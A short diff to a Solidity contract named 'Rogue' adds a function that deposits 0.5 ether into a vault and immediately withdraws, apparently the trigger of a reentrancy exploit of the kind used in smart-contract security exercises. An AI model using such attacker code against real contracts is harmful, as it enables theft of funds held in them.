@@ -17,6 +17,10 @@ contract Rogue {
         }
     }
 
-    
-
+    /// @notice Deposit the ether value required and trigger the attack
+    function rogueAttack() external payable {
+        require(msg.value >= 0.5 ether);
+        vault.deposit{value: 0.5 ether}();
+        vault.withdraw();
+    }
 }
